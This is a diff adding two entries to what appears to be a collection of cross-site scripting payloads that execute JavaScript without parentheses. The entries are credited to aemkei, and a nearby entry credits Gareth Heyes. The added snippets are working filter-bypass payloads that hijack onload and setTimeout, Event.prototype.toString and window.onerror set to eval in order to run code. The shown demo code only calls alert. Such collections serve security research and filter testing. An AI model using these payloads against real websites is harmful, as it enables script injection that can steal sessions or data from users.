@@ -150,6 +150,20 @@ location = /javascript:/.source + alert.name+x+23+x
     
 ---
 
+[aemkei](https://twitter.com/aemkei/status/1291104722875830274?s=20)
+
+    onload=setTimeout
+    Event.prototype.toString=
+    _=>"alert\5023\51"
+    
+---
+
+[aemkei](https://twitter.com/aemkei/status/1290768241225326595?s=20)
+
+    throw/**/Uncaught=window.onerror=eval,&quot;;alert\5023\51&quot;
+    
+---
+
 [Gareth Heyes](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)
 
 ```
